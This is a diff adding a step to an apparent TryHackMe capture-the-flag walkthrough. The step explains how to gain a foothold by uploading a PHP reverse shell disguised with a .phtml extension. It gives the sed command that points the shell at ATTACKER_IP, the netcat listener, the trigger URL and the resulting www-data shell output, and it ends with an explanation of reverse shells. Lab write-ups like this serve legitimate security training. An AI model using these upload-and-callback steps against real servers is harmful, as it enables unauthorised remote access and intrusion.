@@ -547,6 +547,52 @@ There's your outlier. Ignore the Status column (all `200`, the app returns 200 e
 </div>
 
 Prepare a PHP reverse shell, save it with the `.phtml` extension, start a listener, upload it, and trigger it to catch a shell on the target.
+
+**Steps:**
+
+1. Copy the pentestmonkey PHP reverse shell (bundled with Kali) and rename it to the allowed extension in one move:
+
+```
+cp /usr/share/webshells/php/php-reverse-shell.php ./php-reverse-shell.phtml
+```
+
+2. Edit the shell so it calls back to your machine. Set `$ip` to your TryHackMe `tun0` address and leave `$port` at `1234`:
+
+```
+sed -i 's/127.0.0.1/ATTACKER_IP/' php-reverse-shell.phtml
+grep -E '\$ip|\$port' php-reverse-shell.phtml
+```
+
+3. Start a netcat listener on the matching port and leave it running:
+
+```
+nc -lvnp 1234
+```
+
+4. Upload `php-reverse-shell.phtml` through the form at `http://TARGET_IP:3333/internal/`, then trigger it by visiting the uploads directory:
+
+```
+http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml
+```
+
+The browser tab hangs, which is expected: the request never returns because the script is busy running the shell.
+
+**Result (listener catches the callback):**
+
+```
+listening on [any] 1234 ...
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 58124
+Linux ip-TARGET_IP 5.15.0-139-generic #149~20.04.1-Ubuntu SMP x86_64 GNU/Linux
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+```
+
+**Theory, how a reverse shell works:** A shell is just an interactive command interpreter. A normal (bind) shell would have the target open a listening port and wait for you to connect in, but inbound ports are usually firewalled, so that often fails. A reverse shell flips the direction: the target initiates an outbound connection back to you, and outbound traffic is rarely blocked. You run a listener (`nc -lvnp 1234`) that waits for that call. When the uploaded PHP runs, it connects out to your IP and wires the server's `/bin/sh` to that connection, so everything you type travels to the target and its output comes back to you. The shell runs as whatever account executed it, here `www-data`, the low-privilege service account Apache uses.
+
+**What this gives you:** Key finding: an interactive shell on the target as `www-data`, confirmed by `id` and `whoami`. This is the initial foothold and the pivot point for enumerating the filesystem and escalating privileges.
 <div align="center">
 <br>
 <br>
